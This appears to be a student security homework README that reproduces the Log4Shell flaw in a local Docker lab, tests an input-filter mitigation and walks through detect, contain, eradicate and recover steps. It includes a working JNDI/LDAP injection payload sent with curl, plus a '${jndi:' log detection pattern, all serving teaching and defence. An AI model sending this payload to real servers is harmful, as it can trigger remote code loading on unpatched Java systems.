# SEAS 8405 - Homework 9
## 1. Steps to reproduce Log4Shell zero-day vulnerability
1. Run docker compose up --build
2. Run python simple_ldap_server.py
3. Validate LDAP server by running: ldapsearch -x -H ldap://localhost:389 -b "dc=example,dc=org" "(cn=bob)"
4. Run curl -X POST -H 'Content-Type: text/plain' --data-raw '\${jndi:ldap://host.docker.internal:389/a}' http://localhost:8080/log
5. See JNDI call to LDAP server due to Log4Shell vulnerability.

## 2. Steps to attempt to reproduce after mitigation controls
1. Run docker compose up --build
2. Run python simple_ldap_server.py
3. Validate LDAP server by running: ldapsearch -x -H ldap://localhost:389 -b "dc=example,dc=org" "(cn=bob)"
4. Run curl -X POST -H 'Content-Type: text/plain' --data-raw '\${jndi:ldap://host.docker.internal:389/a}' http://localhost:8080/log
5. See "Invalid input detected!" message.
6. Run benign command: curl -X POST http://localhost:8080/log -d 'Hello, world!'
7. See Logged: Hello%2C+world%21=%

## 3. Simulating the incident response
1. Detect incident by checking the Docker logs for "${jndi:" request fragment. 
    - Execute "docker compose logs app"
2. Contain the incident by stoping the vulnerable container
    - Execute "docker compose down"
3. Eradicate: Confirm that no malicious processes are running.
    - Execute "docker ps -a"
4. Recover by deploying the patched application
    - Run "docker compose up --build"
5. Explanation:
    - Detect: Identified the attack via logs.
    - Contain: Isolated the system by stopping the container.
    - Eradicate: Ensured no residual threats.
    - Recover: Restored a secure version.